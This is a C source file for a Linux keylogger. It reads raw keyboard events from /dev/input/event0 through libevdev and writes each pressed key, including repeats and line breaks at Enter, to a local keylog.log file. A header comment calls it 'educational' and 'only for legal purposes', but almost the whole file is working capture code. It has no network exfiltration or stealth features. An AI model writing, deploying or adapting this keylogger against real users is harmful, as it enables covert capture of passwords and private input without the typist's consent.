//Created for educational purposes only. Only for legal purposes.
#include<unistd.h>
#include<stdlib.h>
#include<stdio.h>
#include<fcntl.h>
#include<errno.h>
#include<string.h>
#include<signal.h>
#include <linux/input.h>
#include <sys/stat.h>
#include<libevdev-1.0/libevdev/libevdev.h>
#include<ctype.h>


FILE *file;
struct libevdev *dev;
char *str;


void cleanup(){
	if (file != NULL){
		fprintf(file, "\n");
		fprintf(file, "\nCleanup() called Linux_Keylogger was Exited");
		fclose(file);
	}

	if (dev != NULL){
		libevdev_free(dev);
	}

	if (str != NULL){
		free(str);
	}
}

void sigintHandler(int signum){
	exit(EXIT_SUCCESS);
}


char* updateString(char *str){
	char *position = strstr(str,"KEY_"); 
	
	if (position != NULL){
		memmove(position, position + 4, strlen(position + 4) +1);
		
	}

	return str;

}



int main(int argc, char* argv[]){

	atexit(cleanup); // Register cleanup function
	signal(SIGINT, sigintHandler); //Register SIGINT handler

        dev = NULL;
	int fd;
        int rc =1;       


        fd = open("/dev/input/event0", O_RDONLY|O_NONBLOCK);
        rc = libevdev_new_from_fd(fd, &dev);

        if (rc < 0){
                fprintf(stderr, "Failed to initiate libevdev %s\n", strerror(-rc));
                exit(EXIT_FAILURE);
        }
	 

        file = fopen("keylog.log", "w");

        if (file == NULL){
                fprintf(stderr, "Failed to open Keylog.log in write mode");
                exit(EXIT_FAILURE);
        }


        fprintf(file, "Input device name: \"%s\"\n", libevdev_get_name(dev));
        fprintf(file, "Input device ID: bus %#x vendor %#x product %#x\n", libevdev_get_id_bustype(dev), libevdev_get_id_vendor(dev), libevdev_get_id_product(dev));

	

        if (!libevdev_has_event_type(dev, EV_KEY) || !libevdev_has_event_code(dev, EV_KEY, KEY_SPACE)){
                printf("This device does not support the space bar key");
                exit(EXIT_FAILURE);
        }
	const char *tempstr;
	str = malloc(sizeof(char) * 256);

	fprintf(file,"\n");

	int repeat = 0;
	
        do {
		struct input_event ev;
                rc = libevdev_next_event(dev, LIBEVDEV_READ_FLAG_NORMAL, &ev);

                if (rc  == 0)
		{		

			tempstr = libevdev_event_code_get_name(ev.type, ev.code);
			
			strncpy(str, tempstr, 255);
			str[255]= '\0'; //ensures the string is null terminated


			str = updateString(str);

			
			if (strlen(str) < 2){
				*str = tolower(*str); 
			}
			
			if (ev.value == 2 && repeat == 0){
				
				fprintf(file, "  (A repeat event of the last input has occured!)  ");

				repeat = 1;

			}else if (strstr(str, "_") == NULL && ev.value ==  1){ 
				if (strstr(str, "ENTER")){
					fprintf(file, "%s \n", str);
				}else{
					fprintf(file, "%s ", str);
				}

				repeat = 0;
			}

                }else if (rc == -EAGAIN){
			continue;
		}else{
			fprintf(stderr, "Failed to read event: %s\n", strerror(-rc));
			break;
		}	
        }while(1);

   	return 0;
}

